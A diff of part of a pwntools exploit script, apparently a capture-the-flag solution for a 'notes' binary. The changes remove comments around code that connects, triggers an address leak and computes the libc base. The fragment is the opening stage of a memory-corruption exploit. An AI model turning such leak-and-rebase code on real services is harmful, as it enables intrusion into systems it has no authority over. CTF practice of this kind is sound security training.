@@ -111,10 +111,9 @@ context.terminal = ["tmux", "splitw", "-h"]
 encode = lambda e: e if type(e) == bytes else str(e).encode()  # Lambda function to encode strings to bytes
 hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)     # Lambda function to convert hex string to integer
 
-# Set up executable file and ELF context
-exe = "./notes"            # Path to the executable
-elf = context.binary = ELF(exe)  # Load the ELF binary
-libc = elf.libc            # Get the libc
+exe = "./notes"
+elf = context.binary = ELF(exe)
+libc = elf.libc
 
 # Set up the connection (remote or local)
 io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
@@ -132,8 +131,8 @@ io.sendlineafter(b"$ ", b"2")
 io.sendlineafter(b": ", b"0")
 
 # Receiving leaked address and parsing it
-leak = int(io.recvline().split(b"|")[1], 16)   # Receive the leaked address and convert it to integer
-print("leak @ %#x" % leak)                    # Print the leaked address
+leak = int(io.recvline().split(b"|")[1], 16)
+print("leak @ %#x" % leak)
 
 
 libc.address = leak - 0x29d90   # Calculating the libc base address based on the leaked address
